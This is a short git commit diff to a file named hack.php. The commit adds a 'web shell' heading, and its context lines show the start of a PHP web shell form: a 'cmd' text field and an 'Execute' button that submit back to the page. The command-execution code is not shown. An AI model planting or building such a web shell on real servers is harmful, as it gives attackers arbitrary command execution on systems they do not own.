f86e0b050620ac6f6e8adecf8b136396ce441f6a
DSecon <46611818+DSecon@users.noreply.github.com>
2024-01-21 15:52:31 +0900

    Update hack.php

--- hack.php
+++ hack.php
@@ -1,5 +1,6 @@
 <html>
 <body>
+<h1>web shell</h1>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
 <input type="SUBMIT" value="Execute">
